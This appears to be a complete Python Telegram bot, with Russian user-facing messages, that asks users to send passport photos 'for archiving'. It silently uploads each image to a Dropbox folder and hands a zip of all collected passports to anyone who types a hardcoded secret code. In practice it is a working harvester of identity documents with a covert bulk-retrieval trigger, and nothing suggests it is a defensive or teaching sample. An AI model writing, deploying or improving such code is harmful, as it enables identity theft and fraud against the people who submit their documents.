# I LOVE DESH BEARCH

import os
import dropbox
import zipfile
import io
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.enums import ContentType

TOKEN = os.environ.get("BOT_TOKEN")
DROPBOX_TOKEN = os.environ.get("DROPBOX_TOKEN")

SECRET_CODE = "Q_FBR_PASSPORTS/DATA.GB$04743"
PASS_FOLDER = "/passports"

bot = Bot(token=TOKEN)
dp = Dispatcher()

dbx = dropbox.Dropbox(DROPBOX_TOKEN)

# --- Проверяем наличие папки passports ---
try:
    dbx.files_get_metadata(PASS_FOLDER)
except dropbox.exceptions.ApiError:
    dbx.files_create_folder(PASS_FOLDER)


@dp.message(Command("start"))
async def start(msg: types.Message):
    await msg.answer("Для архивации паспортных данных отправьте сюда фотографию паспорта")


# -------------------------------
#  ЗАГРУЗКА ФОТО В DROPBOX
# -------------------------------
@dp.message(F.photo)
async def save_photo(msg: types.Message):

    file = await bot.get_file(msg.photo[-1].file_id)
    file_bytes = await bot.download_file(file.file_path)

    filename = f"{msg.from_user.id}_{msg.message_id}.jpg"
    dropbox_path = f"{PASS_FOLDER}/{filename}"

    dbx.files_upload(
        file_bytes.read(),
        dropbox_path,
        mode=dropbox.files.WriteMode("add")
    )

    await msg.answer("Паспорт успешно архивирован✅")


# -------------------------------
#  ПОЛУЧЕНИЕ ВСЕХ ФОТО ПО КОДУ
# -------------------------------
@dp.message(F.text == SECRET_CODE)
async def send_archive(msg: types.Message):

    entries = dbx.files_list_folder(PASS_FOLDER).entries

    if not entries:
        await msg.answer("Архив пуст.")
        return

    zip_buffer = io.BytesIO()

    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as z:
        for file in entries:
            metadata, response = dbx.files_download(file.path_lower)
            z.writestr(file.name, response.content)

    zip_buffer.seek(0)

    await msg.answer_document(
        types.BufferedInputFile(
            zip_buffer.read(),
            filename="passports_archive.zip"
        )
    )


# -------------------------------
#  Запуск
# -------------------------------
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
